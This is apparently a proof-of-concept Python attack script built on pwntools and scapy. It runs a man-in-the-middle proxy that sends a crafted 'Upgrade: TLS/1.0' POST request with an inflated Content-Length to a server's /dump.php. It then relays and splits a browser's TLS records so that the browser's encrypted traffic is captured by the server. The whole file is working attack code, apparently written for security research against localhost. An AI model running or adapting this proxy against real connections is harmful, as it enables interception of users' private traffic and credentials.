from pwn import * 
from scapy.layers.tls.all import TLS


context.log_level = 'info'

LPORT = 1234
RHOST = 'localhost'
RPORT = 80
RPORT_TLS = 443


_TLS_RECORD_TYPES = {
    20: "CCS",
    21: "Alert",
    22: "Handshake",
    23: "AppData",
}


# connect both sides 
def forward(src, dest, split_records=False):
    label = f'[{src.label} -> {dest.label}]'
    while True:
        try:
            # split and delay sending of TLS records
            if split_records:
                head = src.recvn(5)
                record_type = head[0]
                version = head[1:3]
                length = int.from_bytes(head[3:5], "big")
                data = src.recvn(length)
                log.info(f"{label} {_TLS_RECORD_TYPES.get(record_type, 'Unknown')} v={version.hex()} {length}B")
                dest.send(head + data)
                sleep(0.2)
            else:
                data = src.recv()
                log.info(f'{label} {TLS(data).summary()}')
                dest.send(data)
        except Exception as e:
            print(e)
            print(f'{label} Error forwarding data')
            print(f'{label} {src.connected()} -> {dest.connected()}')
            break


if len(sys.argv) > 1:
    CONTENTLENGTH = int(sys.argv[1]) 
else:
    CONTENTLENGTH = 767



while True:

    l = listen(LPORT)
    log.info(f'Listening on port {LPORT}')
    l.wait_for_connection()

    log.info('Connecting to server')
    r = remote(RHOST, RPORT)

    l.label = 'Browser'
    r.label = 'Server'


    upgrade_request = (
            'POST /dump.php HTTP/1.1\r\n'
            'Host: localhost\r\n'
            'User-Agent: AttackerScript\r\n'
            'Upgrade: TLS/1.0\r\n'
            'Connection: Upgrade\r\n'
            'Connection: keep-alive\r\n'
            # Firefox
            # f'Content-Length: {16384}\r\n'
            # Chrome (record max size 16384)
            f'Content-Length: {CONTENTLENGTH + 16384}\r\n'
            #'Content-Length: 639\r\n'
            # 'content-type: application/x-www-form-urlencoded\r\n'
            '\r\n'
            # 'username=admin&password=admin'
        ).encode()
    


    r.send(upgrade_request)
    upgrade_response = r.recv()
    print(upgrade_response.decode())
    assert('101 Switching Protocols' in upgrade_response.decode())

    t1 = Thread(target=forward, args=(l, r, True))
    t2 = Thread(target=forward, args=(r, l))

    t1.start()
    t2.start()












